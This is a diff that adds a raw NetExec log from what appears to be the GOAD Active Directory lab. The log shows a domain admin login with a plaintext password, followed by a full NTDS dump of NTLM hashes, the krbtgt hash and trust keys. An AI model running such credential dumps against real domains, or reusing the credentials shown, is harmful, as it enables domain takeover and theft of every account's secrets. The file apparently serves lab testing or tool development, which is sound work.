@@ -1,0 +1,29 @@
+SMB                      192.168.56.11   445    winterfell       [*] Windows 10 / Server 2019 Build 17763 x64 (name:winterfell) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB                      192.168.56.11   445    winterfell       [+] north.sevenkingdoms.local\goadmin:Wildf1re-Kn0ws (Pwn3d!)
+SMB                      192.168.56.11   445    winterfell       [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB                      192.168.56.11   445    winterfell       goadmin:500:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+SMB                      192.168.56.11   445    winterfell       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB                      192.168.56.11   445    winterfell       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3da3e0c7a3b611ce543e82a3a16fd14e:::
+SMB                      192.168.56.11   445    winterfell       ansible:1008:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+SMB                      192.168.56.11   445    winterfell       Administrator:1009:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+SMB                      192.168.56.11   445    winterfell       arya.stark:1119:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
+SMB                      192.168.56.11   445    winterfell       eddard.stark:1120:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
+SMB                      192.168.56.11   445    winterfell       catelyn.stark:1121:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
+SMB                      192.168.56.11   445    winterfell       robb.stark:1122:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
+SMB                      192.168.56.11   445    winterfell       sansa.stark:1123:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
+SMB                      192.168.56.11   445    winterfell       brandon.stark:1124:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
+SMB                      192.168.56.11   445    winterfell       rickon.stark:1125:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
+SMB                      192.168.56.11   445    winterfell       hodor:1126:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
+SMB                      192.168.56.11   445    winterfell       jon.snow:1127:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
+SMB                      192.168.56.11   445    winterfell       samwell.tarly:1128:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
+SMB                      192.168.56.11   445    winterfell       jeor.mormont:1129:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
+SMB                      192.168.56.11   445    winterfell       sql_svc:1130:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+SMB                      192.168.56.11   445    winterfell       WINTERFELL$:1010:aad3b435b51404eeaad3b435b51404ee:295f27913f1ba02e037afcabb0c63b09:::
+SMB                      192.168.56.11   445    winterfell       CASTELBLACK$:1114:aad3b435b51404eeaad3b435b51404ee:ee60bd81c40cefe3b85a9072f60fc045:::
+SMB                      192.168.56.11   445    winterfell       SEVENKINGDOMS$:1113:aad3b435b51404eeaad3b435b51404ee:50a95c4af7cd1e8d846c0a1d8cde6f22:::
+SMB                      192.168.56.11   445    winterfell       [*] Trust keys:
+SMB                      192.168.56.11   445    winterfell       sevenkingdoms.local (Incoming):rc4_hmac:50a95c4af7cd1e8d846c0a1d8cde6f22
+SMB                      192.168.56.11   445    winterfell       sevenkingdoms.local (Outgoing):rc4_hmac:50a95c4af7cd1e8d846c0a1d8cde6f22
+SMB                      192.168.56.11   445    winterfell       [+] Dumped 22 NTDS hashes to /home/kali/.nxc/logs/ntds/winterfell_192.168.56.11_2026-10-19_141813.ntds of which 17 were added to the database
+SMB                      192.168.56.11   445    winterfell       [*] To extract only enabled accounts from the output file, run the following command: 
+SMB                      192.168.56.11   445    winterfell       [*] grep -iv disabled /home/kali/.nxc/logs/ntds/winterfell_192.168.56.11_2026-10-19_141813.ntds | cut -d ':' -f1
